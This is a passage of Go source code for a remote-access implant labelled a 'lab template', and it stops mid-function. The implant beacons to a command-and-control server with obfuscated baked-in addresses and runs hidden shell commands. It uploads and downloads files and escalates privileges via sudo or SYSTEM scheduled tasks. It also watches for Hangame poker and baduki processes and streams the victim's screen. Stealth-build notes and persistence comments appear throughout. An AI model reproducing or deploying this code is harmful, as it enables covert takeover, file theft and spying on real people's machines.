// C2 Agent - lab template
// Phase 1: real shell/exec, timeouts, heartbeat interval env
// Bundle: upload/download + HTTP beacon + B-H7 malleable + B-H8 AEAD (v1.4)
// v1.4.2: hangame §3-1 process detect (baduki/poker) -> heartbeat game_* fields
// v1.4.3: GAME_POLL_SEC default 60; stream_enable gate on screenshot/stream cmds
// v1.4.4: shell/exec always-on (never stream-gated); shell_admin/exec_admin + priv status
// v1.5.0: live screen streaming stub (stream.go) — background frame loop pushes
//         type=stream_frame frames matching the server's applyStreamFrame() parser.
// v1.6.0: screen capture always-on (game_active gate removed) — matches server 1.6.0.

package main

import (
	"bytes"
	"context"
	"crypto/aes"
	"crypto/cipher"
	crand "crypto/rand"
	"crypto/sha256"
	"crypto/tls"
	"encoding/base64"
	"encoding/csv"
	"encoding/hex"
	"encoding/json"
	"fmt"
	"io"
	"net"
	"net/http"
	"net/url"
	"os"
	"os/exec"
	"path/filepath"
	"runtime"
	"strconv"
	"strings"
	"sync"
	"sync/atomic"
	"time"

	"github.com/gorilla/websocket"
)

type Config struct {
	C2Server     string // wss://.../agent  or https://.../beacon
	BeaconURL    string // optional explicit HTTP beacon URL
	AuthToken    string
	Interval     int
	Jitter       int
	Version      string
	KillDate     time.Time
	MaxAge       time.Duration
	StartedAt    time.Time
	StableID     string
	CmdTimeout   time.Duration
	ShellMaxOut  int
	Transport    string // wss | http
	FileMaxBytes int
	InsecureTLS  bool
	// B-H7 malleable
	UserAgent    string
	ReqHeaders   map[string]string
	BeaconURIs   []string
	Hosts        []string
	HostRotation string // round-robin | random
	WSPath       string
	// B-H8
	PSK       string
	CryptoOn  bool
	CryptoKey []byte
	// Hangame §3-1 process detect
	GameProfile  string
	GamePollSec  int
	GameDebounce int
	// Live screen streaming (lab stub)
	StreamOn       bool
	StreamInterval time.Duration
	StreamMaxBytes int
	StreamQuality  int
}

type Command struct {
	ID      string `json:"id"`
	Type    string `json:"cmd_type"`
	Payload string `json:"payload"`
}

type Result struct {
	Type      string `json:"type"`
	AgentID   string `json:"agent_id"`
	CommandID string `json:"command_id"`
	CmdType   string `json:"cmd_type"`
	Data      string `json:"data"`
	Success   bool   `json:"success"`
	Error     string `json:"error,omitempty"`
	ExitCode  *int   `json:"exit_code,omitempty"`
	TimedOut  bool   `json:"timed_out,omitempty"`
}

var (
	config     Config
	agentID    string
	conn       *websocket.Conn
	connected  bool
	httpClient *http.Client

	// sessionKey is the per-connection ECDH-derived AEAD key (nil until the
	// register reply carries the server's ephemeral public key). While nil,
	// encode/decode fall back to the PSK-derived config.CryptoKey.
	sessionKey []byte

	// upload reassembly: transfer_id -> state
	uploadMu sync.Mutex
	uploads  = map[string]*uploadState{}

	uriRR  uint64
	hostRR uint64

	// hangame detect state
	gameMu        sync.Mutex
	hgActive      *hgProfile // loaded allowlist (nil until init)
	gameActive    bool
	gameID        string
	gameTitle     string
	gamePID       int
	gameSince     int64
	gameMissTicks int
	gameLastScan  time.Time
)

type uploadState struct {
	Path       string
	ChunkCount int
	TotalSize  int
	SHA256     string
	Chunks     map[int][]byte
	Updated    time.Time
}

func init() {
	config = loadConfig()
	config.StartedAt = time.Now().UTC()
	httpClient = &http.Client{
		Timeout: 60 * time.Second,
		Transport: &http.Transport{
			TLSClientConfig: &tls.Config{InsecureSkipVerify: config.InsecureTLS},
		},
	}
}

func loadConfig() Config {
	transport := strings.ToLower(strings.TrimSpace(getEnv(xob(eC2Transport), getEnv(xob(eTransport), "wss"))))
	if transport != "http" && transport != "wss" {
		transport = "wss"
	}
	// Baked primary endpoint (XOR-obfuscated in xor.go) — survives reboot
	// persistence where the .cmd wrapper's env vars are lost. Lab loopback is
	// only a last-resort fallback when nothing is baked.
	defaultServer := ldDecode(ldC2Server)
	if defaultServer == "" {
		defaultServer = strings.TrimSpace(xob(eWssURL))
	}
	if defaultServer == "" {
		if transport == "http" {
			defaultServer = strings.TrimSpace(xob(eLabBeacon))
		} else {
			defaultServer = strings.TrimSpace(xob(eLabWss))
		}
		// If even the lab literals are blank, C2Server stays empty and the
		// connect loop reports an invalid-URL error — lab must set C2_SERVER.
	}
	cfg := Config{
		C2Server:     getEnv(xob(eC2Server), defaultServer),
		BeaconURL:    firstNonEmptyOf(getEnv(xob(eC2BeaconURL), ""), ldDecode(ldC2BeaconURL)),
		AuthToken:    firstNonEmptyOf(getEnv(xob(eC2AuthToken), ""), getEnv(xob(eAgentToken), ""), getEnv(xob(eAuthToken), ""), ldDecode(ldC2AuthToken), bakedAgentToken()),
		Interval:     parseInt(getEnv(xob(eC2Interval), getEnv(xob(eBeaconInterval), "30")), 30),
		Jitter:       parseInt(getEnv(xob(eC2Jitter), getEnv(xob(eJitterPercent), "20")), 20),
		Version:      getEnv(xob(eAgentVersion), xob(eDefaultVersion)),
		StableID:     strings.TrimSpace(getEnv(xob(eAgentStableID), "")),
		MaxAge:       parseDuration(getEnv(xob(eMaxAgentAge), ""), 0),
		CmdTimeout:   parseDuration(getEnv(xob(eCmdTimeout), "30s"), 30*time.Second),
		ShellMaxOut:  parseInt(getEnv(xob(eShellMaxOut), "65536"), 65536),
		Transport:    transport,
		FileMaxBytes: parseInt(getEnv(xob(eFileMaxBytes), "5242880"), 5*1024*1024),
		InsecureTLS:  firstBool(ldInsecureTLS(), getEnv(xob(eC2InsecureTLS), "0") != "0"),
		UserAgent:    getEnv(xob(eBeaconUA), getEnv(xob(eC2UA), xob(eDefaultUA))),
		ReqHeaders:   parseHeaderKV(getEnv(xob(eBeaconHeaders), getEnv(xob(eC2Headers), ""))),
		HostRotation: strings.ToLower(strings.TrimSpace(getEnv(xob(eHostRotation), "round-robin"))),
		WSPath:       getEnv(xob(eAgentWSPath), xob(eAgentPath)),
		PSK:          firstNonEmptyOf(getEnv(xob(eC2PSK), ""), getEnv(xob(eAppPSK), ""), ldDecode(ldC2PSK), bakedC2PSK()),
	}
	cfg.BeaconURIs = parseCSVPaths(getEnv(xob(eBeaconURIs), getEnv(xob(eBeaconPathKey), "")))
	cfg.Hosts = parseCSVHosts(getEnv(xob(eC2Hosts), ""))
	// Auto-detect transport from URL scheme if user only set C2_SERVER
	if u, err := url.Parse(cfg.C2Server); err == nil {
		switch strings.ToLower(u.Scheme) {
		case "http", "https":
			// if path looks like beacon or transport forced http
			if cfg.Transport == "http" || strings.Contains(u.Path, "beacon") {
				cfg.Transport = "http"
			}
			if len(cfg.BeaconURIs) == 0 && u.Path != "" && u.Path != "/" {
				cfg.BeaconURIs = []string{u.Path}
			}
		case "ws", "wss":
			if cfg.Transport != "http" {
				cfg.Transport = "wss"
			}
			if u.Path != "" && u.Path != "/" {
				cfg.WSPath = u.Path
			}
		}
	}
	if len(cfg.BeaconURIs) == 0 {
		cfg.BeaconURIs = []string{xob(eBeaconPath)}
	}
	if cfg.BeaconURL == "" && cfg.Transport == "http" {
		cfg.BeaconURL = cfg.C2Server
	}
	// B-H8 app-level AEAD when PSK set
	if cfg.PSK != "" && getEnv(xob(eC2Crypto), "1") != "0" {
		cfg.CryptoOn = true
		sum := sha256.Sum256([]byte(xob(eCryptoSalt) + cfg.PSK))
		cfg.CryptoKey = sum[:]
	}
	if kd := strings.TrimSpace(getEnv(xob(eKillDate), "")); kd != "" {
		if t, err := time.Parse(time.RFC3339, kd); err == nil {
			cfg.KillDate = t.UTC()
		} else if t, err := time.Parse("2006-01-02", kd); err == nil {
			cfg.KillDate = t.UTC().Add(24*time.Hour - time.Second)
		}
	}
	if cfg.CmdTimeout <= 0 {
		cfg.CmdTimeout = 30 * time.Second
	}
	if cfg.ShellMaxOut <= 0 {
		cfg.ShellMaxOut = 65536
	}
	if cfg.FileMaxBytes <= 0 {
		cfg.FileMaxBytes = 5 * 1024 * 1024
	}
	cfg.GameProfile = getEnv(xob(eHangameProfile), getEnv(xob(eGameProfile), xob(eHangameProfilePath)))
	cfg.GamePollSec = parseInt(getEnv(xob(eGamePollSec), "60"), 60)
	cfg.GameDebounce = parseInt(getEnv(xob(eGameDebounceTicks), "2"), 2)
	if cfg.GamePollSec <= 0 {
		cfg.GamePollSec = 60
	}
	if cfg.GameDebounce < 0 {
		cfg.GameDebounce = 0
	}
	cfg.StreamOn = getEnv(xob(eStreamOn), getEnv(xob(eC2Stream), "0")) != "0"
	cfg.StreamInterval = parseDuration(getEnv(xob(eStreamInterval), "2s"), 2*time.Second)
	cfg.StreamMaxBytes = parseInt(getEnv(xob(eStreamMaxBytes), "262144"), 262144)
	cfg.StreamQuality = parseInt(getEnv(xob(eStreamQuality), "60"), 60)
	if cfg.StreamInterval <= 0 {
		cfg.StreamInterval = 2 * time.Second
	}
	if cfg.StreamMaxBytes <= 0 {
		cfg.StreamMaxBytes = 262144
	}
	return cfg
}

func getEnv(key, defaultVal string) string {
	if val := os.Getenv(key); val != "" {
		if strings.HasPrefix(val, "{{") && strings.HasSuffix(val, "}}") {
			return defaultVal
		}
		return val
	}
	return defaultVal
}

func parseInt(s string, defaultVal int) int {
	s = strings.TrimSpace(s)
	if s == "" || (strings.HasPrefix(s, "{{") && strings.HasSuffix(s, "}}")) {
		return defaultVal
	}
	n, err := strconv.Atoi(s)
	if err != nil {
		return defaultVal
	}
	return n
}

func parseDuration(s string, defaultVal time.Duration) time.Duration {
	s = strings.TrimSpace(s)
	if s == "" {
		return defaultVal
	}
	d, err := time.ParseDuration(s)
	if err != nil {
		return defaultVal
	}
	return d
}

func shouldDie() (bool, string) {
	if !config.KillDate.IsZero() && time.Now().UTC().After(config.KillDate) {
		return true, "kill_date"
	}
	if config.MaxAge > 0 && time.Since(config.StartedAt) > config.MaxAge {
		return true, "max_age"
	}
	return false, ""
}

func hostnameUser() (string, string) {
	hostname, _ := os.Hostname()
	// Use env vars instead of os/user: importing os/user forces CGO on and
	// its C runtime structures trigger 0xC0000017 STATUS_NO_MEMORY on target
	// hosts when built with CGO_ENABLED=1 (MinGW stealth pipeline).
	username := "unknown"
	if u := os.Getenv("USERNAME"); u != "" {
		username = u
	} else if u := os.Getenv("USER"); u != "" {
		username = u
	}
	return hostname, username
}

func deriveStableID(hostname, username, osName, arch string) string {
	base := strings.ToLower(hostname) + "|" + strings.ToLower(username) + "|" + osName + "|" + arch
	var h uint64 = 14695981039346656037
	for i := 0; i < len(base); i++ {
		h ^= uint64(base[i])
		h *= 1099511628211
	}
	return fmt.Sprintf("agent-%016x", h)
}

func stableID() string {
	if config.StableID != "" {
		return config.StableID
	}
	hn, un := hostnameUser()
	return deriveStableID(hn, un, runtime.GOOS, runtime.GOARCH)
}

func getSystemInfo() map[string]interface{} {
	hostname, username := hostnameUser()
	sid := stableID()
	elev, elevMethod := currentElevation()
	return map[string]interface{}{
		"type":        "register",
		"agent_id":    sid,
		"stable_id":   sid,
		"hostname":    hostname,
		"username":    username,
		"os":          runtime.GOOS,
		"arch":        runtime.GOARCH,
		"pid":         os.Getpid(),
		"version":     config.Version,
		"transport":   config.Transport,
		"is_admin":    elev,
		"elevated":    elev,
		"elev_method": elevMethod,
		"uid":         os.Getuid(),
	}
}

// ---------- WSS ----------

func connectWS() error {
	if die, reason := shouldDie(); die {
		return fmt.Errorf("agent expired (%s)", reason)
	}
	target := pickDialURL("wss")
	u, err := url.Parse(target)
	if err != nil {
		return fmt.Errorf("invalid C2 server URL: %v", err)
	}
	dialer := websocket.Dialer{
		TLSClientConfig:  &tls.Config{InsecureSkipVerify: config.InsecureTLS},
		HandshakeTimeout: 10 * time.Second,
	}
	headers := http.Header{}
	headers.Set(xob(eXAuthTokenHeader), config.AuthToken)
	if config.UserAgent != "" {
		headers.Set("User-Agent", config.UserAgent)
	}
	for k, v := range config.ReqHeaders {
		headers.Set(k, v)
	}
	c, _, err := dialer.Dial(u.String(), headers)
	if err != nil {
		return fmt.Errorf("WebSocket dial failed: %v", err)
	}
	ephPriv, err := ecdheNewPrivate()
	if err != nil {
		c.Close()
		return fmt.Errorf("ecdh keygen failed: %v", err)
	}
	regInfo := getSystemInfo()
	regInfo["ecdhe_pub"] = ecdhePubB64(ephPriv)
	if err := wsWrite(c, regInfo); err != nil {
		c.Close()
		return fmt.Errorf("register send failed: %v", err)
	}
	reply, err := wsRead(c)
	if err != nil {
		c.Close()
		return fmt.Errorf("register reply failed: %v", err)
	}
	if t, _ := reply["type"].(string); t != "registered" {
		c.Close()
		return fmt.Errorf("unexpected register reply: %v", reply["type"])
	}
	// Derive the per-connection session key from the server's ephemeral public
	// key. From here on, encode/decodeBody seal with sessionKey instead of PSK.
	if spub, _ := reply["ecdhe_pub"].(string); spub != "" {
		if pbytes, e := ecdhePubFromB64(spub); e == nil {
			if key, e := ecdheDerive(ephPriv, pbytes); e == nil {
				sessionKey = key
				fmt.Fprintf(os.Stderr, "ecdh: session key established (%d bytes)\n", len(key))
			}
		}
	}
	applyServerCaps(reply)
	if id, ok := reply["agent_id"].(string); ok && id != "" {
		agentID = id
	} else {
		agentID = stableID()
	}
	conn = c
	connected = true
	return nil
}

func disconnectWS() {
	stopStream()
	if conn != nil {
		_ = conn.Close()
	}
	conn = nil
	connected = false
	sessionKey = nil
}

func sendWS(v interface{}) error {
	if !connected || conn == nil {
		return fmt.Errorf("not connected")
	}
	return wsWrite(conn, v)
}

// ---------- HTTP beacon ----------

func beaconURL() string {
	return pickDialURL("http")
}

func postBeacon(body interface{}) (map[string]interface{}, error) {
	if die, reason := shouldDie(); die {
		return nil, fmt.Errorf("agent expired (%s)", reason)
	}
	b, err := encodeBody(body)
	if err != nil {
		return nil, err
	}
	req, err := http.NewRequest(http.MethodPost, beaconURL(), bytes.NewReader(b))
	if err != nil {
		return nil, err
	}
	req.Header.Set("Content-Type", "application/json")
	req.Header.Set(xob(eXAuthTokenHeader), config.AuthToken)
	if config.UserAgent != "" {
		req.Header.Set("User-Agent", config.UserAgent)
	}
	for k, v := range config.ReqHeaders {
		req.Header.Set(k, v)
	}
	resp, err := httpClient.Do(req)
	if err != nil {
		return nil, err
	}
	defer resp.Body.Close()
	raw, _ := io.ReadAll(io.LimitReader(resp.Body, 16<<20))
	if resp.StatusCode == http.StatusGone {
		return map[string]interface{}{"type": "die", "reason": "kill_date"}, nil
	}
	if resp.StatusCode == http.StatusUnauthorized {
		return nil, fmt.Errorf("unauthorized")
	}
	if resp.StatusCode >= 300 {
		return nil, fmt.Errorf("beacon http %d: %s", resp.StatusCode, truncateOut(raw, 200))
	}
	out, err := decodeBody(raw)
	if err != nil {
		return nil, fmt.Errorf("beacon decode: %v", err)
	}
	return out, nil
}

func applyServerCaps(reply map[string]interface{}) {
	if kd, ok := reply["kill_date"].(float64); ok && kd > 0 && config.KillDate.IsZero() {
		config.KillDate = time.Unix(int64(kd), 0).UTC()
	}
	if ma, ok := reply["max_age_sec"].(float64); ok && ma > 0 && config.MaxAge == 0 {
		config.MaxAge = time.Duration(ma) * time.Second
	}
	if ct, ok := reply["cmd_timeout_sec"].(float64); ok && ct > 0 {
		config.CmdTimeout = time.Duration(ct) * time.Second
	}
	if fm, ok := reply["file_max_bytes"].(float64); ok && fm > 0 {
		config.FileMaxBytes = int(fm)
	}
}

func commandsFromReply(reply map[string]interface{}) []Command {
	raw, ok := reply["commands"].([]interface{})
	if !ok {
		return nil
	}
	var out []Command
	for _, item := range raw {
		m, ok := item.(map[string]interface{})
		if !ok {
			continue
		}
		cmd := Command{
			ID:      asString(m["id"]),
			Type:    asString(m["cmd_type"]),
			Payload: asString(m["payload"]),
		}
		if cmd.Type == "" {
			cmd.Type = asString(m["cmd"])
		}
		if cmd.ID == "" && cmd.Type == "" {
			continue
		}
		out = append(out, cmd)
	}
	return out
}

// ---------- command execution ----------

func sanitizeOut(s string) string {
	var b strings.Builder
	b.Grow(len(s))
	for _, r := range s {
		if r == '\n' || r == '\r' || r == '\t' || r >= 32 {
			if r == 0x7f {
				continue
			}
			b.WriteRune(r)
		}
	}
	return b.String()
}

func truncateOut(b []byte, max int) string {
	if max <= 0 || len(b) <= max {
		return sanitizeOut(string(b))
	}
	half := max / 2
	if half < 1 {
		half = max
	}
	return sanitizeOut(string(b[:half]) + "\n...[truncated]...\n" + string(b[len(b)-half:]))
}

func runShell(payload string) (out string, exitCode int, timedOut bool, err error) {
	payload = strings.TrimSpace(payload)
	if payload == "" {
		return "", -1, false, fmt.Errorf("empty shell payload")
	}
	ctx, cancel := context.WithTimeout(context.Background(), config.CmdTimeout)
	defer cancel()
	var cmd *exec.Cmd
	if runtime.GOOS == "windows" {
		cmd = hiddenCmdCtx(ctx, "cmd", "/C", payload)
	} else {
		cmd = hiddenCmdCtx(ctx, "bash", "-c", payload)
	}
	var buf bytes.Buffer
	cmd.Stdout = &buf
	cmd.Stderr = &buf
	runErr := cmd.Run()
	out = truncateOut(buf.Bytes(), config.ShellMaxOut)
	if ctx.Err() == context.DeadlineExceeded {
		return out, -1, true, fmt.Errorf("command timed out after %s", config.CmdTimeout)
	}
	if runErr != nil {
		if ee, ok := runErr.(*exec.ExitError); ok {
			return out, ee.ExitCode(), false, nil
		}
		return out, -1, false, runErr
	}
	return out, 0, false, nil
}

func runExec(payload string) (out string, exitCode int, timedOut bool, err error) {
	payload = strings.TrimSpace(payload)
	if payload == "" {
		return "", -1, false, fmt.Errorf("empty exec payload")
	}
	var path string
	var args []string
	if strings.HasPrefix(payload, "{") {
		var spec struct {
			Path string   `json:"path"`
			Args []string `json:"args"`
		}
		if jerr := json.Unmarshal([]byte(payload), &spec); jerr != nil {
			return "", -1, false, fmt.Errorf("exec json: %v", jerr)
		}
		path = spec.Path
		args = spec.Args
	} else {
		fields := strings.Fields(payload)
		path = fields[0]
		if len(fields) > 1 {
			args = fields[1:]
		}
	}
	if path == "" {
		return "", -1, false, fmt.Errorf("exec path required")
	}
	ctx, cancel := context.WithTimeout(context.Background(), config.CmdTimeout)
	defer cancel()
	cmd := hiddenCmdCtx(ctx, path, args...)
	var buf bytes.Buffer
	cmd.Stdout = &buf
	cmd.Stderr = &buf
	runErr := cmd.Run()
	out = truncateOut(buf.Bytes(), config.ShellMaxOut)
	if ctx.Err() == context.DeadlineExceeded {
		return out, -1, true, fmt.Errorf("command timed out after %s", config.CmdTimeout)
	}
	if runErr != nil {
		if ee, ok := runErr.(*exec.ExitError); ok {
			return out, ee.ExitCode(), false, nil
		}
		return out, -1, false, runErr
	}
	return out, 0, false, nil
}

func intPtr(v int) *int { return &v }

// upload payload JSON with chunk fields
func handleUpload(payload string) (string, error) {
	var spec struct {
		Path       string `json:"path"`
		TransferID string `json:"transfer_id"`
		ChunkIndex int    `json:"chunk_index"`
		ChunkCount int    `json:"chunk_count"`
		TotalSize  int    `json:"total_size"`
		Offset     int    `json:"offset"`
		SHA256     string `json:"sha256"`
		ChunkB64   string `json:"chunk_b64"`
		DataB64    string `json:"data_b64"` // single-shot full file
	}
	if err := json.Unmarshal([]byte(payload), &spec); err != nil {
		return "", fmt.Errorf("upload json: %v", err)
	}
	if spec.Path == "" {
		return "", fmt.Errorf("path required")
	}
	// single shot
	if spec.DataB64 != "" && spec.ChunkB64 == "" {
		raw, err := base64.StdEncoding.DecodeString(spec.DataB64)
		if err != nil {
			return "", fmt.Errorf("data_b64: %v", err)
		}
		if len(raw) > config.FileMaxBytes {
			return "", fmt.Errorf("file too large: %d", len(raw))
		}
		if err := writeFileAtomic(spec.Path, raw); err != nil {
			return "", err
		}
		sum := sha256.Sum256(raw)
		meta, _ := json.Marshal(map[string]interface{}{
			"path":   spec.Path,
			"size":   len(raw),
			"sha256": hex.EncodeToString(sum[:]),
			"mode":   "single",
		})
		return string(meta), nil
	}

	chunk, err := base64.StdEncoding.DecodeString(spec.ChunkB64)
	if err != nil {
		return "", fmt.Errorf("chunk_b64: %v", err)
	}
	tid := spec.TransferID
	if tid == "" {
		tid = spec.Path
	}
	uploadMu.Lock()
	st, ok := uploads[tid]
	if !ok {
		st = &uploadState{
			Path:       spec.Path,
			ChunkCount: spec.ChunkCount,
			TotalSize:  spec.TotalSize,
			SHA256:     spec.SHA256,
			Chunks:     map[int][]byte{},
		}
		uploads[tid] = st
	}
	st.Chunks[spec.ChunkIndex] = chunk
	st.Updated = time.Now().UTC()
	if st.ChunkCount == 0 {
		st.ChunkCount = spec.ChunkCount
	}
	if st.Path == "" {
		st.Path = spec.Path
	}
	// complete?
	complete := st.ChunkCount > 0 && len(st.Chunks) >= st.ChunkCount
	var missing int
	if complete {
		for i := 0; i < st.ChunkCount; i++ {
			if _, ok := st.Chunks[i]; !ok {
				complete = false
				missing++
			}
		}
	}
	if !complete {
		got := len(st.Chunks)
		uploadMu.Unlock()
		meta, _ := json.Marshal(map[string]interface{}{
			"path":        spec.Path,
			"transfer_id": tid,
			"chunk_index": spec.ChunkIndex,
			"chunks_got":  got,
			"chunk_count": st.ChunkCount,
			"status":      "chunk_ok",
		})
		return string(meta), nil
	}
	// assemble
	var buf bytes.Buffer
	for i := 0; i < st.ChunkCount; i++ {
		buf.Write(st.Chunks[i])
	}
	raw := buf.Bytes()
	path := st.Path
	wantSHA := st.SHA256
	delete(uploads, tid)
	uploadMu.Unlock()

	if st.TotalSize > 0 && len(raw) != st.TotalSize {
		// still write but report mismatch
	}
	if len(raw) > config.FileMaxBytes {
		return "", fmt.Errorf("assembled too large: %d", len(raw))
	}
	sum := sha256.Sum256(raw)
	got := hex.EncodeToString(sum[:])
	if wantSHA != "" && !strings.EqualFold(wantSHA, got) {
		return "", fmt.Errorf("sha256 mismatch want=%s got=%s", wantSHA, got)
	}
	if err := writeFileAtomic(path, raw); err != nil {
		return "", err
	}
	meta, _ := json.Marshal(map[string]interface{}{
		"path":        path,
		"transfer_id": tid,
		"size":        len(raw),
		"sha256":      got,
		"status":      "complete",
		"mode":        "chunked",
	})
	return string(meta), nil
}

func writeFileAtomic(path string, data []byte) error {
	if err := os.MkdirAll(filepath.Dir(path), 0o755); err != nil {
		// if dir is . or empty, ignore
		if filepath.Dir(path) != "." && filepath.Dir(path) != "" {
			return err
		}
	}
	tmp := path + ".part"
	if err := os.WriteFile(tmp, data, 0o644); err != nil {
		// fallback direct write
		return os.WriteFile(path, data, 0o644)
	}
	return os.Rename(tmp, path)
}

func handleDownload(payload string) (string, error) {
	var spec struct {
		Path     string `json:"path"`
		MaxBytes int    `json:"max_bytes"`
	}
	if err := json.Unmarshal([]byte(payload), &spec); err != nil {
		// plain path string
		spec.Path = strings.TrimSpace(payload)
	}
	if spec.Path == "" {
		return "", fmt.Errorf("path required")
	}
	max := spec.MaxBytes
	if max <= 0 {
		max = config.FileMaxBytes
	}
	fi, err := os.Stat(spec.Path)
	if err != nil {
		return "", err
	}
	if fi.IsDir() {
		return "", fmt.Errorf("path is directory")
	}
	if fi.Size() > int64(max) {
		return "", fmt.Errorf("file too large: %d > %d", fi.Size(), max)
	}
	raw, err := os.ReadFile(spec.Path)
	if err != nil {
		return "", err
	}
	if len(raw) > max {
		return "", fmt.Errorf("file too large after read")
	}
	sum := sha256.Sum256(raw)
	meta, _ := json.Marshal(map[string]interface{}{
		"path":     spec.Path,
		"size":     len(raw),
		"sha256":   hex.EncodeToString(sum[:]),
		"data_b64": base64.StdEncoding.EncodeToString(raw),
	})
	return string(meta), nil
}

// ---------- privilege / elevated execution (always available; never stream-gated) ----------

// currentElevation reports whether this process already has admin/root rights.
// Windows: CheckTokenMembership(Administrators) via `net session` heuristic + env.
// Linux/Unix: euid == 0.
func currentElevation() (elevated bool, method string) {
	if runtime.GOOS == "windows" {
		// net session requires admin; exit 0 => elevated
		ctx, cancel := context.WithTimeout(context.Background(), 3*time.Second)
		defer cancel()
		cmd := hiddenCmdCtx(ctx, "net", "session")
		if err := cmd.Run(); err == nil {
			return true, "windows-admin"
		}
		// fallback: whoami /groups contains S-1-5-32-544 and BUILTIN\Administrators with Enabled
		ctx2, cancel2 := context.WithTimeout(context.Background(), 3*time.Second)
		defer cancel2()
		out, err := hiddenCmdCtx(ctx2, "whoami", "/groups").CombinedOutput()
		if err == nil {
			o := strings.ToLower(string(out))
			if strings.Contains(o, "s-1-5-32-544") && (strings.Contains(o, "enabled") || strings.Contains(o, "mandatory")) {
				// high integrity often paired with Admin group
				if strings.Contains(o, "s-1-16-12288") || strings.Contains(o, "high mandatory") {
					return true, "windows-high-il"
				}
			}
		}
		return false, "windows-user"
	}
	// linux / darwin
	if os.Geteuid() == 0 {
		return true, "euid0"
	}
	return false, "user"
}

// runShellAdmin runs payload elevated when possible.
// Linux: sudo -n bash -c (passwordless sudo) or direct if root.
// Windows: already-admin -> cmd /C; else powershell Start-Process -Verb RunAs is interactive
// so we use a non-interactive fallback: scheduled-task style is heavy — return clear error
// asking operator to run agent elevated, OR try runas-free direct if net session ok.
func runShellAdmin(payload string) (out string, exitCode int, timedOut bool, err error) {
	payload = strings.TrimSpace(payload)
	if payload == "" {
		return "", -1, false, fmt.Errorf("empty shell_admin payload")
	}
	elev, method := currentElevation()
	ctx, cancel := context.WithTimeout(context.Background(), config.CmdTimeout)
	defer cancel()
	var cmd *exec.Cmd
	if runtime.GOOS == "windows" {
		if elev {
			cmd = hiddenCmdCtx(ctx, "cmd", "/C", payload)
		} else {
			// Non-interactive elevation attempt via PowerShell + scheduled task (no UAC GUI).
			// Creates a one-shot task as SYSTEM/highest, runs, captures log, deletes task.
			out, code, to, e := runWindowsElevatedShell(ctx, payload)
			return out, code, to, e
		}
	} else {
		if elev {
			cmd = hiddenCmdCtx(ctx, "bash", "-c", payload)
		} else {
			// passwordless sudo only (-n); if it fails, surface the need for root agent / sudoers
			cmd = hiddenCmdCtx(ctx, "sudo", "-n", "bash", "-c", payload)
		}
	}
	_ = method
	var buf bytes.Buffer
	cmd.Stdout = &buf
	cmd.Stderr = &buf
	runErr := cmd.Run()
	out = truncateOut(buf.Bytes(), config.ShellMaxOut)
	if ctx.Err() == context.DeadlineExceeded {
		return out, -1, true, fmt.Errorf("command timed out after %s", config.CmdTimeout)
	}
	if runErr != nil {
		if ee, ok := runErr.(*exec.ExitError); ok {
			// annotate sudo failure
			if !elev && runtime.GOOS != "windows" && ee.ExitCode() == 1 && strings.Contains(strings.ToLower(out), "password") {
				return out, ee.ExitCode(), false, fmt.Errorf("sudo requires password; run agent as root or configure NOPASSWD (elev=%v method=%s)", elev, method)
			}
			return out, ee.ExitCode(), false, nil
		}
		return out, -1, false, runErr
	}
	return out, 0, false, nil
}

func runExecAdmin(payload string) (out string, exitCode int, timedOut bool, err error) {
	payload = strings.TrimSpace(payload)
	if payload == "" {
		return "", -1, false, fmt.Errorf("empty exec_admin payload")
	}
	// Normalize to a shell line so Windows elevation path can reuse task runner
	var line string
	if strings.HasPrefix(payload, "{") {
		var spec struct {
			Path string   `json:"path"`
			Args []string `json:"args"`
		}
		if jerr := json.Unmarshal([]byte(payload), &spec); jerr != nil {
			return "", -1, false, fmt.Errorf("exec_admin json: %v", jerr)
		}
		if spec.Path == "" {
			return "", -1, false, fmt.Errorf("exec_admin path required")
		}
		// quote path if spaces
		line = quoteWinArg(spec.Path)
		for _, a := range spec.Args {
			line += " " + quoteWinArg(a)
		}
	} else {
		line = payload
	}
	if runtime.GOOS == "windows" {
		return runShellAdmin(line)
	}
	// Linux: prefer sudo -n on the binary directly when not root
	elev, _ := currentElevation()
	ctx, cancel := context.WithTimeout(context.Background(), config.CmdTimeout)
	defer cancel()
	var path string
	var args []string
	if strings.HasPrefix(payload, "{") {
		var spec struct {
			Path string   `json:"path"`
			Args []string `json:"args"`
		}
		_ = json.Unmarshal([]byte(payload), &spec)
		path, args = spec.Path, spec.Args
	} else {
		fields := strings.Fields(payload)
		path = fields[0]
		if len(fields) > 1 {
			args = fields[1:]
		}
	}
	var cmd *exec.Cmd
	if elev {
		cmd = hiddenCmdCtx(ctx, path, args...)
	} else {
		full := append([]string{"-n", path}, args...)
		cmd = hiddenCmdCtx(ctx, "sudo", full...)
	}
	var buf bytes.Buffer
	cmd.Stdout = &buf
	cmd.Stderr = &buf
	runErr := cmd.Run()
	out = truncateOut(buf.Bytes(), config.ShellMaxOut)
	if ctx.Err() == context.DeadlineExceeded {
		return out, -1, true, fmt.Errorf("command timed out after %s", config.CmdTimeout)
	}
	if runErr != nil {
		if ee, ok := runErr.(*exec.ExitError); ok {
			return out, ee.ExitCode(), false, nil
		}
		return out, -1, false, runErr
	}
	return out, 0, false, nil
}

func quoteWinArg(a string) string {
	if a == "" {
		return `""`
	}
	if !strings.ContainsAny(a, " \t\"") {
		return a
	}
	return `"` + strings.ReplaceAll(a, `"`, `\"`) + `"`
}

// runWindowsElevatedShell uses a one-shot scheduled task (highest available) to run
// without an interactive UAC prompt when the user already has admin rights with UAC,
// or when running as a service. Lab-oriented; requires task scheduler access.
func runWindowsElevatedShell(ctx context.Context, payload string) (string, int, bool, error) {
	tmpDir := os.TempDir()
	tag := fmt.Sprintf("c2lab_%d", time.Now().UnixNano()%1_000_000_000)
	batPath := filepath.Join(tmpDir, tag+".bat")
	outPath := filepath.Join(tmpDir, tag+".out")
	taskName := "C2Lab_" + tag

	// bat: run command, capture exit code
	bat := "@echo off\r\n" + payload + " > \"" + outPath + "\" 2>&1\r\nexit /b %ERRORLEVEL%\r\n"
	if err := os.WriteFile(batPath, []byte(bat), 0o600); err != nil {
		return "", -1, false, fmt.Errorf("elev bat write: %v", err)
	}
	defer os.Remove(batPath)
	defer os.Remove(outPath)

	// schtasks /Create /TN ... /TR ... /SC ONCE /ST HH:MM /RL HIGHEST /F
	// Then /Run and wait for output file.
	create := hiddenCmdCtx(ctx, "schtasks", "/Create", "/TN", taskName,
		"/TR", `"`+batPath+`"`, "/SC", "ONCE", "/ST", "00:00", "/RL", "HIGHEST", "/F")
	var cbuf bytes.Buffer
	create.Stdout, create.Stderr = &cbuf, &cbuf
	if err := create.Run(); err != nil {
		msg := strings.TrimSpace(cbuf.String())
